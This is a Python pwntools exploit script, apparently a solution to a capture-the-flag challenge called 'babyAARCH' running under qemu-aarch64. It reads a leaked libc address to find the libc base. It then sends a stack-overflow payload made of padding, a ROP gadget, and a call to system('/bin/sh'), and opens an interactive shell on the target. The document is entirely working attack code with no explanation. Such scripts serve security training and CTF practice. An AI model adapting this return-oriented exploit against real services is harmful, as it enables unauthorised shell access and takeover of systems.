#!/usr/bin/env python3

from pwn import *
import re

elf = ELF("../challenge/babyAARCH")
libc = ELF("../challenge/libc.so.6")

if args.GDB:
    io = process(["qemu-aarch64", "-g", "12345", elf.path])
elif args.LOCAL:
    io = process(["qemu-aarch64", elf.path])
else:
    io = remote("0.0.0.0", 1337)


def main():

    PAD = b"A" * 0x20
    io.recvlines(4)
    match = re.search("0x([0-9a-f]+)", io.recvline().decode())
    libc.address = int(match.group(1), 16) - libc.sym["system"]
    io.recvline()
    log.info(hex(libc.address))

    bin_sh = next(libc.search(b"/bin/sh"))
    ldr_x0 = libc.address + 0x00000000000b7d28 #: ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret

    exploit = PAD + p64(ldr_x0) + p64(0xdeadbeefdeadbeef) + p64(libc.sym["system"]) + p64(bin_sh)

    io.sendline(exploit)




    io.interactive()

if __name__ == "__main__":
    main()